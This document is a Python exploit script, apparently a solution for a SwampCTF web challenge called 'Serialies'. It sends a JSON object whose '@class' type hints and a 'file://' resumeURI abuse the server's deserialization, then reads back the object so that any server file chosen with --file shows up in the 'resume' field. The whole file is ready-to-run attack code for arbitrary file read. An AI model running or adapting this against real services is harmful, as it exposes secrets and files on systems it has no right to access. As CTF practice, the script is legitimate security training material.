#!/usr/bin/env python3

import requests
import uuid
import argparse
import sys

def generate_payload(file_path, attacker_name="notagain"):
    """Create the JSON payload to inject a vulnerable object"""
    exploit_id = str(uuid.uuid4())
    payload = {
        "@class": "com.serialies.serialies.Person",
        "id": exploit_id,
        "name": attacker_name,
        "age": 1337,
        "address": {
            "@class": "com.serialies.serialies.Address",
            "street": "leet st",
            "city": "HaxCity",
            "state": "CTF",
            "zipCode": "1337"
        },
        "job": {
            "@class": "com.serialies.serialies.Job",
            "title": "h4x0r",
            "company": "Otaku Inc",
            "salary": 999999.0,
            "resume": f"{attacker_name} wuz here ðŸ˜ˆ",
            "resumeURI": f"file://{file_path}"
        }
    }
    return exploit_id, payload

def send_payload(base_url, payload):
    """Send a POST request with the JSON payload"""
    res = requests.post(base_url, json=payload)
    if res.ok:
        print("[+] Payload successfully sent")
    else:
        print("[-] Failed to send payload")
        sys.exit(1)

def fetch_flag(base_url, exploit_id):
    """Send a GET request to retrieve the object and extract file content"""
    url = f"{base_url}/{exploit_id}"
    res = requests.get(url)
    if not res.ok:
        print("[-] Failed to fetch response")
        sys.exit(1)

    try:
        data = res.json()
        resume = data["job"]["resume"]
        return resume
    except Exception as e:
        print("[-] Error while parsing response:", str(e))
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description="SwampCTF - Serialies File Read Exploit")
    parser.add_argument("--url", required=True, help="Base URL (e.g. http://chals.swampctf.com)")
    parser.add_argument("--port", required=True, type=int, help="Target port")
    parser.add_argument("--file", required=True, help="Path to the file you want to read (e.g. /flag.txt)")
    args = parser.parse_args()

    base_url = f"{args.url}:{args.port}/api/person"
    exploit_id, payload = generate_payload(args.file)

    send_payload(base_url, payload)
    content = fetch_flag(base_url, exploit_id)
    
    print(f"[+] ID: {exploit_id}")
    print(f"[+] File Content: {content}")

if __name__ == "__main__":
    main()
